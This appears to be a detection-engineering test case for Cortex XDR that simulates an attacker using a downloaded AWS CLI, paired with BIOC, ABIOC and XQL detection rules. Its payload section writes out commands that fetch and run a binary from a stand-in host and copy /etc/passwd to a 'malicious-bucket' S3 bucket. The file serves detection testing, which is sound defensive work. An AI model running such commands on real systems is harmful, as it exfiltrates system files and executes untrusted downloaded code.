identity.name: Uncommon Cloud CLI Tool Usage via AWS CLI
identity.summary: An attacker uses awscli to upload a file to S3, triggering an ABIOC for uncommon cloud CLI usage. Cortex should detect the unusual process behavior and network connection to AWS.
identity.description: An attacker uses awscli to upload a file to S3, triggering an ABIOC for uncommon cloud CLI usage. Cortex should detect the unusual process behavior and network connection to AWS.

payload.code:
wget -O /tmp/awscli https://example.com/awscli
chmod +x /tmp/awscli
/tmp/awscli configure set aws_access_key_id fakekey
/tmp/awscli configure set aws_secret_access_key fakesecret
/tmp/awscli s3 cp /etc/passwd s3://malicious-bucket/passwd

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Uncommon Cloud CLI Process Start
biocs.description: Detection of AWS CLI being executed from non-standard location
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/awscli'
| filter actor_process_image_name != 'bash'
| filter actor_process_image_name != 'sh'

abiocs.name: Uncommon Cloud CLI Usage Behavior
abiocs.description: ML-based detection of AWS CLI being used in unexpected way for file upload
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/awscli'
| filter action_file_path = '/etc/passwd'
| filter action_remote_ip = 's3.amazonaws.com'

xql_queries.name: AWS CLI Process Start with S3 Upload
xql_queries.query:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = '/tmp/awscli'
| filter action_file_path = '/etc/passwd'
| filter action_remote_ip = 's3.amazonaws.com'
